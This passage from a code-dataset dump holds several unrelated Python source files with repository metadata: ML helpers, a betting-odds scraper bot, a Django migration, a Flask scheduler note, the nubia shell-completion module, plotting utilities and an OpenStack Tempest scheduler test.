shuffle=True):\n    n = X.shape[0]\n    idx = np.arange(n)\n    if shuffle:\n        np.random.shuffle(idx)\n    for start_idx in range(0, n - batch_size + 1, batch_size):\n        idx_slice = idx[start_idx:start_idx+batch_size]\n        mini_batch = X[idx_slice]\n        if y is not None:\n            mini_batch = (mini_batch, y[idx_slice])\n        yield mini_batch\n\n\ndef xavier_init(fan_in, fan_out, constant=1):\n    \"\"\" Xavier initialization of network weights\"\"\"\n    # https://stackoverflow.com/questions/33640581/how-to-do-xavier-initialization-on-tensorflow\n    low = -constant*np.sqrt(6.0/(fan_in + fan_out))\n    high = constant*np.sqrt(6.0/(fan_in + fan_out))\n    return tf.Variable(tf.random_uniform((fan_in, fan_out),\n                             minval=low, maxval=high,\n                             dtype=tf.float32))\n"}
{"blob_id": "edf2ed88a4e0f0ba246feac3d7dc0a66c2cf1645", "directory_id": "af835d13b74a27036ba6f6b1c42c970b081f1738", "path": "/bot3.py", "content_id": "a912f3f3356a7331cfe1df7e9110900a82b8893a", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "aimarperuchena/SurebetBot", "snapshot_id": "85ff6b6f608ca69ba59ddfcacd4bbee93fbec982", "revision_id": "1234d340d672a29171ea5616954c15285badbc03", "branch_name": "refs/heads/master", "visit_date": "2021-01-02 04:59:37.380170", "revision_date": "2020-02-13 14:04:42", "committer_date": "2020-02-13 14:04:42", "github_id": "239498782", "star_events_count": "1", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "7347", "extension": "py", "content": "import urllib.request\nimport pymysql\nimport urlopen\nimport request\nimport requests\nfrom bs4 import BeautifulSoup\nfrom datetime import date\nimport datetime\nfrom urllib.request import Request, urlopen\n\n\ndef enviarPost(match, fecha, team1, team2, odd1, odd2, odd3, bookie1, bookie2, bookie3, percentage):\n    today = date.today()\n\n    url = 'http://192.168.0.12:1234/api/surebet'\n    objeto = {'match': match, 'date': fecha, 'team1': team1, 'team2': team2, 'odd1': odd1, 'odd2': odd2,\n              'odd3': odd3, 'bookie1': bookie1, 'bookie2': bookie2, 'bookie3': bookie3, 'percentage': percentage}\n    x = requests.post(url, data=objeto)\n    print(x.text)\n    if len(x.text) > 0:\n        print('----------------------------' +\n              bookie1+'------------------------')\n        print('----------------------------' +\n              bookie2+'------------------------')\n        print('----------------------------' +\n              bookie3+'------------------------')\n\n\ndef leerFutbolLigas():\n    headers = {\n        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.3'}\n    req = Request(\n        url='https://www.centroapuesta.com/apuestas/futbol/espana/laliga/', headers=headers)\n    html = urlopen(req).read()\n    soup2 = BeautifulSoup(html)\n    content = soup2.find(\"div\", {\"id\": \"content\"})\n    menu_apuestas_deportes = content.find(\n        \"div\", {\"id\": \"menu-apuestas-deportes\"})\n    sports_menu = menu_apuestas_deportes.find(\"nav\", {\"class\": \"sports-menu\"})\n    ul = sports_menu.find(\"ul\")\n    '''SPORTS'''\n    li = ul.find(\"li\", {\"class\": \"futbol\"})\n    ul = li.find(\"ul\")\n    '''COUNTRIES'''\n    lis = ul.findAll(\"li\")\n    for li in lis:\n        ul = li.find(\"ul\")\n        if ul is not None:\n            links = ul.findAll('a')\n            for link in links:\n                print(link[\"href\"])\n                cuotasFutbol(link[\"href\"])\n\n\ndef leerBaloncestoLigas():\n    headers = {\n        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.3'}\n\n    req = Request(\n        url='https://www.centroapuesta.com/apuestas/futbol/espana/laliga/', headers=headers)\n    html = urlopen(req).read()\n    soup2 = BeautifulSoup(html)\n\n    content = soup2.find(\"div\", {\"id\": \"content\"})\n    menu_apuestas_deportes = content.find(\n        \"div\", {\"id\": \"menu-apuestas-deportes\"})\n    sports_menu = menu_apuestas_deportes.find(\"nav\", {\"class\": \"sports-menu\"})\n    ul = sports_menu.find(\"ul\")\n    '''SPORTS'''\n    li = ul.find(\"li\", {\"class\": \"baloncesto\"})\n    ul = li.find(\"ul\")\n    '''COUNTRIES'''\n    lis = ul.findAll(\"li\")\n    for li in lis:\n        ul = li.find(\"ul\")\n        if ul is not None:\n\n            links = ul.findAll('a')\n            for link in links:\n                print(link[\"href\"])\n\n\ndef leerTenisLigas():\n\n    headers = {\n        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.3'}\n\n    req = Request(\n        url='https://www.centroapuesta.com/apuestas/futbol/espana/laliga/', headers=headers)\n    html = urlopen(req).read()\n    soup2 = BeautifulSoup(html)\n\n    content = soup2.find(\"div\", {\"id\": \"content\"})\n    menu_apuestas_deportes = content.find(\n        \"div\", {\"id\": \"menu-apuestas-deportes\"})\n    sports_menu = menu_apuestas_deportes.find(\"nav\", {\"class\": \"sports-menu\"})\n    ul = sports_menu.find(\"ul\")\n    '''SPORTS'''\n    li = ul.find(\"li\", {\"class\": \"tenis\"})\n    ul = li.find(\"ul\")\n    '''COUNTRIES'''\n    lis = ul.findAll(\"li\")\n    for li in lis:\n        ul = li.find(\"ul\")\n        if ul is not None:\n\n            links = ul.findAll('a')\n            for link in links:\n                print(link[\"href\"])\n\n\ndef cuotasFutbol(link):\n\n    arrayLink = link.split(\"/\")\n    deporte = arrayLink[4]\n    liga = arrayLink[5]\n    pais = arrayLink[6]\n\n    headers = {\n        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.3'}\n\n    req = Request(\n        url=link, headers=headers)\n    html = urlopen(req).read()\n    soup2 = BeautifulSoup(html)\n\n    content = soup2.find(\"div\", {\"id\": \"content\"})\n    main_column = content.find(\"div\", {\"class\": \"main-column\"})\n    article = main_column.find(\"article\")\n    matches_table = article.find(\"table\")\n    tbody = matches_table.find(\"tbody\")\n    trs = tbody.findAll(\"tr\")\n    for tr in trs:\n        tds = tr.findAll(\"td\")\n        cont = 0\n        fecha = ''\n        hora = ''\n        match = ''\n        cuota1 = 0\n        cuota2 = 0\n        cuota3 = 0\n        casa1 = ''\n        casa2 = ''\n        casa3 = ''\n        for td in tds:\n\n            if cont == 0:\n                fecha = td.find(\"span\", {\"class\": \"date\"})\n                hora = td.find(\"span\", {\"class\": \"time\"})\n                if fecha is not None:\n                    fecha = fecha.text\n                    hora = hora.text\n\n            if cont == 1:\n                partido = td.find(\"a\")\n                if partido is not None:\n                    match = partido.text.strip()\n\n            if cont == 2:\n                cuota1 = td.find(\"span\")\n                if cuota1 is not None:\n                    casa1 = td.find(\"img\")\n                    cuota1 = float(cuota1.text)\n                    casa1 = casa1[\"alt\"]\n\n            if cont == 3:\n                cuota2 = td.find(\"span\")\n                if cuota2 is not None:\n                    casa2 = td.find(\"img\")\n                    cuota2 = float(cuota2.text)\n                    casa2 = casa2[\"alt\"]\n            if cont == 4:\n                cuota3 = td.find(\"span\")\n                if cuota3 is not None:\n                    casa3 = td.find(\"img\")\n                    cuota3 = float(cuota3.text)\n                    casa3 = casa3[\"alt\"]\n            if cuota1 is not None and cuota2 is not None and cuota3 is not None:\n                if cuota1 > 0 and cuota2 > 0 and cuota3 > 0:\n                    percentage = (1/cuota1)+(1/cuota2)+(1/cuota3)\n                    arrayFecha = fecha.split(\" \")\n                    mes = 0\n                    dia = 0\n                    ano = 0\n\n                    if arrayFecha[1] == \"Feb\":\n                        mes = \"02\"\n                    dia = int(arrayFecha[0].replace(\",\", \"\"))\n                    ano = int(arrayFecha[2])\n                    fecha = str(ano)+\"-\"+str(mes)+\"-\"+str(dia)+\" \"+str(hora)\n                    equipoarray = match.split(\" \u2014 \")\n                    team1 = equipoarray[0]\n                    team2 = equipoarray[1]\n                    odd1 = cuota1\n                    odd2 = cuota2\n                    odd3 = cuota3\n                    bookie1 = casa1\n                    bookie2 = casa2\n                    bookie3 = casa2\n\n                    if bookie1 == \"William Hill\":\n                        bookie1 = \"WilliamHill\"\n                    if bookie2 == \"William Hill\":\n                        bookie2 = \"WilliamHill\"\n                    if bookie3 == \"William Hill\":\n                        bookie3 = \"WilliamHill\"\n                    enviarPost(match, fecha, team1, team2, odd1, odd2, odd3,\n                               bookie1, bookie2, bookie3, percentage, deporte, pais, liga)\n            cont = cont+1\n\n\nleerFutbolLigas()\nprint('---------------')\nleerBaloncestoLigas()\nprint('--------------------')\nleerTenisLigas()\n"}
{"blob_id": "f22b9e1ad65222af15f45672d49dff5fac195b54", "directory_id": "237fac9a0e5b19f8f8640c1bc6989a2ad66be166", "path": "/apps/orders/migrations/0027_merge_20210321_0856.py", "content_id": "49ff9e2d4a6ce8840905e463959e268d73d6def0", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "Spaudel79/RupseOnline", "snapshot_id": "a13d5648210a57b0b3670c41beaea95625df0482", "revision_id": "7109d58767a0f8fb894ae02ad819a706766c6b20", "branch_name": "refs/heads/master", "visit_date": "2023-06-10 10:45:05.072940", "revision_date": "2021-07-09 07:47:53", "committer_date": "2021-07-09 07:47:53", "github_id": "384390938", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "270", "extension": "py", "content": "# Generated by Django 2.2 on 2021-03-21 08:56\n\nfrom django.db import migrations\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('orders', '0025_auto_20210321_1422'),\n        ('orders', '0026_merge_20210315_0915'),\n    ]\n\n    operations = [\n    ]\n"}
{"blob_id": "b4ff7318e817a655714439da1175835c708173dc", "directory_id": "4dc5fcc1277e2f4d4cc58a88a26873a2f41711d4", "path": "/Test/\u5b9a\u65f6\u4efb\u52a1/scheduler.py", "content_id": "a8e6a488b154544f8754dc333f02527eba40e37f", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "pqGC/Python_Note", "snapshot_id": "9db573feacb7eddc8fbd9cf5182e60e775429f18", "revision_id": "59d2dd5550e07a707ba4582edebb891f1c262485", "branch_name": "refs/heads/master", "visit_date": "2020-04-02 12:57:13.592077", "revision_date": "2018-10-24 08:05:19", "committer_date": "2018-10-24 08:05:19", "github_id": "154459818", "star_events_count": "1", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "1202", "extension": "py", "content": "# \u7b2c\u4e00\u6b65 \u914d\u7f6econfig\u6587\u4ef6\nJOBS = [\n        {  # \u4efb\u52a11 \u751f\u6210\u7535\u4fe1\u62a5\u8868CSV\u6587\u4ef6\u5b58\u81f3\u963f\u91cc\u6587\u4ef6\u670d\u52a1\u5668\n            'id': 'job1',\n            'func': 'app.main.schedule_task.make_csv_task:generate_csv',  # \u7b2c\u4e09\u6b65py\u6587\u4ef6\u6240\u5728\u4f4d\u7f6e\u53ca\u5176\u65b9\u6cd5\n            'trigger': 'cron',  # \u5b9a\u70b9\u6267\u884c\u4efb\u52a1\n            'hour': 0,  # 0\u70b901\u5206\n            'minute': 1\n        },\n        {  # \u4efb\u52a12 \u5b9a\u65f6\u66f4\u65b0 BUSINESS \u8868\u7684 signal \u5b57\u6bb5 \u4f7f\u8c03\u5ea6\u4efb\u52a1\u5e73\u5747\u5206\u914d\n            'id': 'job2',\n            'func': 'app.main.schedule_task.update_business:update_signal',\n            'trigger': 'interval',  # \u8ba1\u65f6\u6267\u884c  \u6bcf\u96943600\u79d2\n            'seconds': 3600,\n            'args': (12,)\n        }\n    ]\n\n\n# \u7b2c\u4e8c\u6b65 \u914d\u7f6einit\u542f\u52a8\u6587\u4ef6\nfrom flask_apscheduler import APScheduler\nscheduler = APScheduler()\ndef create_app(config_name):\n    app = Flask(__name__)\n    app.config.from_object(config[config_name])  # \u4ececonfig\u4e2d\u8bfb\u53d6\u5b9a\u65f6\u4efb\u52a1\u7684\u914d\u7f6e\n    scheduler.init_app(app)  # \u628a\u4efb\u52a1\u5217\u8868\u653e\u8fdbflask\n    scheduler.start()  # \u542f\u52a8\u4efb\u52a1\u5217\u8868\n\n\n# \u7b2c\u4e09\u6b65\nfrom app import scheduler\ndef generate_csv():\n\n    with scheduler.app.app_context():\n        # todo\n        # \u65b9\u6cd5\u4f53\n"}
{"blob_id": "79a6440763200a87a0690bc6149639063b1f6735", "directory_id": "4fccfbe5c9cdf595dd3bdb182a6214f593bfd808", "path": "/nubia/internal/completion.py", "content_id": "f205db47f9a60830fd4226a834539959b0d47836", "detected_licenses": "['BSD-3-Clause', 'Python-2.0']", "license_type": "permissive", "repo_name": "MountakBernotas/AzurePython", "snapshot_id": "a3838207cb7ed9f3cd5e5b34aadd0a4eb6ca985d", "revision_id": "5f34b13be8aefc08c491eebaf1692b75b813e1f5", "branch_name": "refs/heads/master", "visit_date": "2020-03-28 16:25:30.226681", "revision_date": "2018-09-13 20:37:30", "committer_date": "2018-09-13 20:37:30", "github_id": "148693461", "star_events_count": "0", "fork_events_count": "1", "gha_license_id": "NOASSERTION", "gha_event_created_at": "2018-12-13 13:33:54", "gha_created_at": "2018-09-13 20:22:54", "gha_language": "Python", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "10195", "extension": "py", "content": "#!/usr/bin/env python3\n\n# Copyright (c) Facebook, Inc. and its affiliates.\n# All rights reserved.\n#\n# This source code is licensed under the BSD-style license found in the\n# LICENSE file in the root directory of this source tree.\n#\n\nimport logging\nimport itertools\nimport pyparsing as pp\nfrom nubia.internal.helpers import function_to_str\n\nfrom typing import Iterable, TYPE_CHECKING\nfrom nubia.internal import parser\nfrom prompt_toolkit.document import Document\nfrom prompt_toolkit.completion import CompleteEvent\nfrom prompt_toolkit.completion import Completion\n\nif TYPE_CHECKING:\n    from nubia.internal.cmdbase import AutoCommand  # noqa\n\n\nclass TokenParse:\n    \"\"\"\n    This class captures an interactive shell token that cannot be fully parser\n    by the interactive shell parser and analyze it.\n    \"\"\"\n\n    def __init__(self, token: str) -> None:\n        self._token = token\n        self._key = \"\"\n        self._is_argument = False\n        self._is_list = False\n        self._is_dict = False\n        self._last_value = \"\"\n        self.parse()\n\n    def parse(self):\n        key, delim, value = self._token.partition(\"=\")\n        # Is everything before the = sane?\n        if any(x in key for x in \"[]{}\\\"'\"):\n            # We will treat this as positional in this case\n            return\n\n        # This is key=value\n        if delim == \"=\":\n            self._is_argument = True\n            self._key = key\n        else:\n            # This is positional, the value is the key\n            value = self._key\n            assert len(value) == 0\n        if len(value) > 0:\n            # Let's parse the value, is it a single, list, dict?\n            if value[0] == \"[\":\n                self._is_list = True\n                value = value.strip(\"[\")\n                list_values = value.rpartition(\",\")\n                self._last_value = list_values[len(list_values) - 1].lstrip()\n            elif value[0] == \"{\":\n                self._is_dict = True\n            else:\n                self._last_value = value\n\n    @property\n    def is_argument(self) -> bool:\n        return self._is_argument\n\n    @property\n    def is_positional(self) -> bool:\n        return not self._is_argument\n\n    # Talks about the type of the value\n    @property\n    def is_list(self) -> bool:\n        return self._is_list\n\n    @property\n    def is_dict(self) -> bool:\n        return self._is_dict\n\n    @property\n    def argument_name(self) -> str:\n        assert self._is_argument\n        return self._key\n\n    def keys(self) -> Iterable[str]:\n        return []\n\n    def values(self) -> Iterable[str]:\n        return []\n\n    @property\n    def last_value(self) -> str:\n        return self._last_value\n\n    @property\n    def is_single_value(self) -> bool:\n        return not (self._is_dict or self._is_list)\n\n\nclass AutoCommandCompletion:\n    \"\"\"\n    This is the interactive completion state machine, it tracks the\n    parsed tokens out of a command input and builds a data model that is\n    used to understand what would be the next natural completion\n    token(s).\n    \"\"\"\n\n    def __init__(\n        self,\n        cmd_obj: \"AutoCommand\",\n        document: Document,\n        complete_event: CompleteEvent,\n    ) -> None:\n        self.doc = document\n        self.cmd = cmd_obj\n        self.meta = self.cmd.metadata\n        self.event = complete_event\n\n        # current state\n\n    def get_completions(self) -> Iterable[Completion]:\n        \"\"\"\n        Returns a\n        \"\"\"\n        logger = logging.getLogger(f\"{type(self).__name__}.get_completions\")\n        remaining = None\n        try:\n            parsed = parser.parse(\n                self.doc.text, expect_subcommand=self.cmd.super_command\n            )\n        except parser.CommandParseError as e:\n            parsed = e.partial_result\n            remaining = e.remaining\n        # This is a funky but reliable way to figure that last token we are\n        # interested in manually parsing, This will return the last key=value\n        # including if the value is a 'value', [list], or {dict} or combination\n        # of these. This also matches positional arguments.\n        if self.doc.char_before_cursor in \" ]}\":\n            last_token = \"\"\n        else:\n            last_space = (\n                self.doc.find_backwards(\" \", in_current_line=True) or -1\n            )\n            last_token = self.doc.text[(last_space + 1) :]  # noqa\n        # We pick the bigger match here. The reason we want to look into\n        # remaining is to capture the state that we are in an open list,\n        # dictionary, or any other value that may have spaces in it but fails\n        # parsing (yet).\n        if remaining and len(remaining) > len(last_token):\n            last_token = remaining\n        try:\n            return self._prepare_args_completions(\n                parsed_command=parsed, last_token=last_token\n            )\n        except Exception as e:\n            logger.exception(str(e))\n            return []\n\n    def _prepare_args_completions(\n        self, parsed_command: pp.ParseResults, last_token\n    ) -> Iterable[Completion]:\n        assert parsed_command is not None\n        args_meta = self.meta.arguments.values()\n        # are we expecting a sub command?\n        if self.cmd.super_command:\n            # We have a sub-command (supposedly)\n            subcommand = parsed_command.get(\"__subcommand__\")\n            assert subcommand\n            sub_meta = self.cmd.subcommand_metadata(subcommand)\n            if not sub_meta:\n                logging.debug(\"Parsing unknown sub-command failed!\")\n                return []\n            # we did find the sub-command, yay!\n            # In this case we chain the arguments from super and the\n            # sub-command together\n            args_meta = itertools.chain(args_meta, sub_meta.arguments.values())\n        # Now let's see if we can figure which argument we are talking about\n        args_meta = self._filter_arguments_by_prefix(last_token, args_meta)\n        # Which arguments did we fully parse already? let's avoid printing them\n        # in completions\n        parsed_keys = parsed_command.asDict().get(\"kv\", [])\n        # We are either completing an argument name, argument value, or\n        # positional value.\n        # Dissect the last_token and figure what is the right completion\n        parsed_token = TokenParse(last_token)\n        if parsed_token.is_positional:\n            # TODO: Handle positional argument completions too\n            # To figure which positional we are in right now, we need to run the\n            # same logic that figures if all required arguments has been\n            # supplied and how many positionals have been processed and which\n            # one is next.\n            # This code is already in cmdbase.py run_interactive but needs to be\n            # refactored to be reusable here.\n            pass\n        elif parsed_token.is_argument:\n            argument_name = parsed_token.argument_name\n            arg = self._find_argument_by_name(argument_name)\n            if not arg or arg.choices in [False, None]:\n                return []\n            # TODO: Support dictionary keys/named tuples completion\n            if parsed_token.is_dict:\n                return []\n            # We are completing a value, in this case, we need to get the last\n            # meaninful piece of the token `x=[Tr` => `Tr`\n            return [\n                Completion(\n                    text=str(choice),\n                    start_position=-len(parsed_token.last_value),\n                )\n                for choice in arg.choices\n                if str(choice)\n                .lower()\n                .startswith(parsed_token.last_value.lower())\n            ]\n        # We are completing arguments, or positionals.\n        # TODO: We would like to only show positional choices if we exhaust all\n        # required arguments. This will make it easier for the user to figure\n        # that there are still required named arguments. After that point we\n        # will show optional arguments and positionals as possible completions\n        ret = [\n            Completion(\n                text=arg_meta.name + \"=\",\n                start_position=-len(last_token),\n                display_meta=self._get_arg_help(arg_meta),\n            )\n            for arg_meta in args_meta\n            if arg_meta.name not in parsed_keys\n        ]\n        return ret\n\n    def _filter_arguments_by_prefix(self, prefix: str, arguments=None):\n        arguments = arguments or self.meta.arguments.values()\n        if prefix:\n            return [\n                arg_meta\n                for arg_meta in arguments\n                if arg_meta.name.startswith(prefix)\n            ]\n        return arguments\n\n    def _prepare_value_completions(self, prefix, partial_result):\n        parsed_keys = map(lambda x: x[0], partial_result.get(\"kv\", []))\n        argument, rest = prefix.split(\"=\", 1)\n        arguments = self._filter_arguments_by_prefix(argument)\n        if len(arguments) < 1:\n            return []\n        if len(arguments) == 1:\n            argument_obj = self._find_argument_by_name(argument)\n            assert argument_obj\n            # was that argument used before?\n            if argument in parsed_keys:\n                logging.debug(\n                    \"Argument {} was used already, not generating \"\n                    \"completions\".format(argument)\n                )\n                return []\n        return []\n\n    def _find_argument_by_name(self, name):\n        args_meta = self.meta.arguments.values()\n        filtered = filter(lambda arg: arg.name == name, args_meta)\n        return next(filtered, None)\n\n    def _get_arg_help(self, arg_meta):\n        sb = [\"[\"]\n        if arg_meta.type:\n            sb.append(function_to_str(arg_meta.type, False, False))\n            sb.append(\", \")\n        if arg_meta.default_value_set:\n            sb.append(\"default: \")\n            sb.append(arg_meta.default_value)\n        else:\n            sb.append(\"required\")\n        sb.append(\"] \")\n        sb.append(\n            arg_meta.description\n            if arg_meta.description\n            else \"<no description provided>\"\n        )\n        return \"\".join(str(item) for item in sb)\n"}
{"blob_id": "979d346c213639fc585374fd840487a42e669460", "directory_id": "9774c9ba2d9ab6ad53e370ef788ed72b9fa68843", "path": "/source/utils.py", "content_id": "3a21bee169ae888feb9d43f4480ad01f123f757d", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "MikhailMamonov/Binary_classification_endo", "snapshot_id": "49c3cfb1556185dfb08459af9bf36827b33d59f8", "revision_id": "8635099b881fe2678670e4debcc77ad2b8a62ac0", "branch_name": "refs/heads/master", "visit_date": "2020-03-18 13:00:04.659891", "revision_date": "2018-05-24 18:51:01", "committer_date": "2018-05-24 18:51:01", "github_id": "134755242", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "2588", "extension": "py", "content": "\"\"\"\nSome useful utilities\n\"\"\"\n\nfrom itertools import product\nfrom os import path, makedirs\nimport numpy as np\nfrom sklearn.metrics import confusion_matrix\nimport matplotlib\n# generates images without having a window appear\nmatplotlib.use('Agg')\nimport matplotlib.pylab as plt\n\"\"\"\nAbsolute utils.py file path. It is considered as the project root path.\n\"\"\"\nCWD = path.dirname(path.realpath(__file__))\n\"\"\"\nIt must contain files with raw data\n\"\"\"\nDATA_PATH = path.join(CWD, 'data')\nTEST_DATA_PATH = path.join(DATA_PATH, 'test')\nTRAIN_DATA_PATH = path.join(DATA_PATH, 'train')\nVALIDATION_DATA_PATH = path.join(DATA_PATH, 'validation')\n\nLOG_PATH = path.join(CWD, 'log')\n\"\"\"\nTrained models must be stored here\n\"\"\"\nMODELS_PATH = path.join(CWD, 'models')\n\"\"\"\nPickled objects must be stored here\n\"\"\"\nPICKLES_PATH = path.join(CWD, 'pickles')\nCLASSES = list(map(str, ['irreg','norma']))\n\n\ndef try_makedirs(name):\n    \"\"\"\n    Makes path if it doesn't exist\n    \"\"\"\n    try:\n        if not path.exists(name):\n            # Strange, but it may raise winerror 123\n            makedirs(name)\n    except OSError:\n        return\n\n\ndef plot_loss_acc(history, model_path):\n    \"\"\"\n    Saves into files accuracy and loss plots\n    \"\"\"\n    plt.gcf().clear()\n    # summarize history for accuracy\n    plt.plot(history.history['acc'])\n    plt.plot(history.history['val_acc'])\n    plt.title('model accuracy')\n    plt.ylabel('accuracy')\n    plt.xlabel('epoch')\n    plt.legend(['train', 'test'], loc='upper left')\n    plt.savefig(path.join(model_path, 'accuracy.png'))\n    plt.gcf().clear()\n    # summarize history for loss\n    plt.plot(history.history['loss'])\n    plt.plot(history.history['val_loss'])\n    plt.title('model loss')\n    plt.ylabel('loss')\n    plt.xlabel('epoch')\n    plt.legend(['train', 'test'], loc='upper left')\n    plt.savefig(path.join(model_path, 'loss.png'))\n    plt.gcf().clear()\n\n\ndef plot_confusion_matrix(cm, classes, model_path, title='Confusion matrix'):\n    \"\"\"\n    This function prints and plots the confusion matrix.\n    Normalization can be applied by setting `normalize=True`.\n    \"\"\"\n    plt.gcf().clear()\n\n    cm = cm.astype('float') / cm.sum(axis=1)[:, np.newaxis]\n    plt.imshow(cm, interpolation='none')\n    plt.title(title)\n    plt.colorbar()\n    tick_marks = np.arange(len(classes))\n    plt.xticks(tick_marks, classes, rotation=90, fontsize=2)\n    plt.yticks(tick_marks, classes, fontsize=2)\n    plt.ylabel('True label')\n    plt.xlabel('Predicted label')\n    plt.grid(False)\n    plt.savefig(path.join(model_path, 'confusion_matrix.pdf'), format='pdf')\n\n    plt.gcf().clear()\n"}
{"blob_id": "30b2448b23a5740bc9fb1a45ed37c3b44dbd3957", "directory_id": "058498e815b20950cc97033c2e4e55c732c3f909", "path": "/tempest/api/compute/admin/test_servers_on_multinodes.py", "content_id": "364a0544d5544d425c2033152fd4ea19608c523a", "detected_licenses": "['Apache-2.0']", "license_type": "permissive", "repo_name": "cisco-openstack/tempest", "snapshot_id": "49c56de4ee2422791fe5cd832083d7b6558c7d0d", "revision_id": "0bc47dbdd05b5d12d048c09800515c2bd03a16ce", "branch_name": "refs/heads/proposed", "visit_date": "2021-01-22 00:11:00.113774", "revision_date": "2020-06-26 09:32:55", "committer_date": "2020-06-26 09:32:55", "github_id": "24151261", "star_events_count": "2", "fork_events_count": "5", "gha_license_id": "Apache-2.0", "gha_event_created_at": "2020-08-07 06:13:20", "gha_created_at": "2014-09-17 15:46:17", "gha_language": "Python", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "5947", "extension": "py", "content": "# Copyright 2016 NEC Corporation.  All rights reserved.\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n\nimport testtools\n\nfrom tempest.api.compute import base\nfrom tempest.common import compute\nfrom tempest import config\nfrom tempest.lib import decorators\n\nCONF = config.CONF\n\n\nclass ServersOnMultiNodesTest(base.BaseV2ComputeAdminTest):\n    \"\"\"Test creating servers on mutiple nodes with scheduler_hints.\"\"\"\n    @classmethod\n    def resource_setup(cls):\n        super(ServersOnMultiNodesTest, cls).resource_setup()\n        cls.server01 = cls.create_test_server(wait_until='ACTIVE')['id']\n        cls.host01 = cls.get_host_for_server(cls.server01)\n\n    @classmethod\n    def skip_checks(cls):\n        super(ServersOnMultiNodesTest, cls).skip_checks()\n\n        if CONF.compute.min_compute_nodes < 2:\n            raise cls.skipException(\n                \"Less than 2 compute nodes, skipping multi-nodes test.\")\n\n    def _create_servers_with_group(self, policy):\n        group_id = self.create_test_server_group(policy=[policy])['id']\n        hints = {'group': group_id}\n        reservation_id = self.create_test_server(\n            scheduler_hints=hints, wait_until='ACTIVE', min_count=2,\n            return_reservation_id=True)['reservation_id']\n\n        # Get the servers using the reservation_id.\n        servers = self.servers_client.list_servers(\n            detail=True, reservation_id=reservation_id)['servers']\n        self.assertEqual(2, len(servers))\n\n        # Assert the servers are in the group.\n        server_group = self.server_groups_client.show_server_group(\n            group_id)['server_group']\n        hosts = {}\n        for server in servers:\n            self.assertIn(server['id'], server_group['members'])\n            hosts[server['id']] = self.get_host_for_server(server['id'])\n\n        return hosts, servers\n\n    @decorators.idempotent_id('26a9d5df-6890-45f2-abc4-a659290cb130')\n    @testtools.skipUnless(\n        compute.is_scheduler_filter_enabled(\"SameHostFilter\"),\n        'SameHostFilter is not available.')\n    def test_create_servers_on_same_host(self):\n        \"\"\"Test creating servers with hints 'same_host'\"\"\"\n        hints = {'same_host': self.server01}\n        server02 = self.create_test_server(scheduler_hints=hints,\n                                           wait_until='ACTIVE')['id']\n        host02 = self.get_host_for_server(server02)\n        self.assertEqual(self.host01, host02)\n        self.delete_server(server02)\n\n    @decorators.idempotent_id('cc7ca884-6e3e-42a3-a92f-c522fcf25e8e')\n    @testtools.skipUnless(\n        compute.is_scheduler_filter_enabled(\"DifferentHostFilter\"),\n        'DifferentHostFilter is not available.')\n    def test_create_servers_on_different_hosts(self):\n        \"\"\"Test creating servers with hints of single 'different_host'\"\"\"\n        hints = {'different_host': self.server01}\n        server02 = self.create_test_server(scheduler_hints=hints,\n                                           wait_until='ACTIVE')['id']\n        host02 = self.get_host_for_server(server02)\n        self.assertNotEqual(self.host01, host02)\n        self.delete_server(server02)\n\n    @decorators.idempotent_id('7869cc84-d661-4e14-9f00-c18cdc89cf57')\n    @testtools.skipUnless(\n        compute.is_scheduler_filter_enabled(\"DifferentHostFilter\"),\n        'DifferentHostFilter is not available.')\n    def test_create_servers_on_different_hosts_with_list_of_servers(self):\n        \"\"\"Test creating servers with hints of a list of 'different_host'\"\"\"\n        hints = {'different_host': [self.server01]}\n        server02 = self.create_test_server(scheduler_hints=hints,\n                                           wait_until='ACTIVE')['id']\n        host02 = self.get_host_for_server(server02)\n        self.assertNotEqual(self.host01, host02)\n        self.delete_server(server02)\n\n    @decorators.idempotent_id('f8bd0867-e459-45f5-ba53-59134552fe04')\n    @testtools.skipUnless(\n        compute.is_scheduler_filter_enabled(\"ServerGroupAntiAffinityFilter\"),\n        'ServerGroupAntiAffinityFilter is not available.')\n    def test_create_server_with_scheduler_hint_group_anti_affinity(self):\n        \"\"\"Tests the ServerGroupAntiAffinityFilter\n\n        Creates two servers in an anti-affinity server group and\n        asserts the servers are in the group and on different hosts.\n        \"\"\"\n        hosts = self._create_servers_with_group('anti-affinity')\n        hostnames = list(hosts.values())\n        self.assertNotEqual(hostnames[0], hostnames[1],\n                            'Servers are on the same host: %s' % hosts)\n      